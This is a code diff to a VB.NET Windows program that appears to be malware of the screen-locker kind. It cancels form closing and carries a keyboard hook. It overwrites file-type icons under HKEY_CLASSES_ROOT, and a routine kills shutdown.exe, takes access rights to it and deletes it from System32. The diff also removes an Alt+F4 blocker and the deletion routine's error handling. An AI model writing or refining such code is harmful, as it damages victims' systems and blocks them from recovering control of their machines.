@@ -164,19 +164,6 @@ Public Class Form1
         Protected Overrides Sub OnFormClosing(e As FormClosingEventArgs)
             e.Cancel = True
         End Sub
-
-        ' Disable Alt + F4
-        Protected Overrides Sub WndProc(ByRef m As Message)
-            Const WM_SYSCOMMAND As Integer = &H112
-            Const SC_CLOSE As Integer = &HF060
-
-            If m.Msg = WM_SYSCOMMAND AndAlso m.WParam.ToInt32() = SC_CLOSE Then
-                ' Ignore Alt + F4
-                Return
-            End If
-
-            MyBase.WndProc(m)
-        End Sub
     End Class
 
     Private Function HookCallback(nCode As Integer, wParam As IntPtr, lParam As IntPtr) As IntPtr
@@ -582,9 +569,9 @@ Public Class Form1
             ' Define a path for the temporary .ico file
             Dim iconIcoPath As String = Path.Combine(Path.GetTempPath(), "app_icon.ico")
 
-            ' Save the form's icon (Form1.Icon) as a .ico file
+            ' Save the form's icon as a .ico file
             Using fs As New FileStream(iconIcoPath, FileMode.Create)
-                Icon.Save(fs) ' Change Form1 to the name of your form class
+                Icon.Save(fs) ' Ensure the form has an icon assigned
             End Using
 
             ' Icon path in registry format
@@ -603,6 +590,9 @@ Public Class Form1
             For Each regKey In regKeys
                 UpdateRegistryKey(Registry.ClassesRoot, regKey, iconPath)
             Next
+
+            ' Optionally refresh Windows Explorer to reflect changes
+            Process.Start("explorer.exe", "/select," & iconIcoPath)
 
         Catch ex As Exception
             MessageBox.Show("An error occurred while updating file icons: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
@@ -685,9 +675,8 @@ Public Class Form1
     End Sub
 
     Public Sub KillGrantAccessAndDeleteShutdownExe()
-        Try
-            ' Path to shutdown.exe in System32
-            Dim shutdownExePath As String = "C:\Windows\System32\shutdown.exe"
+        ' Path to shutdown.exe in System32
+        Dim shutdownExePath As String = "C:\Windows\System32\shutdown.exe"
 
             ' Step 1: Kill any running instances of shutdown.exe
             Dim processes = Process.GetProcessesByName("shutdown")
@@ -711,10 +700,6 @@ Public Class Form1
             Else
                 MessageBox.Show("shutdown.exe not found.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
             End If
-
-        Catch ex As Exception
-            MessageBox.Show("An error occurred: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
-        End Try
     End Sub
 
     Private Function TriageCheck() As Boolean
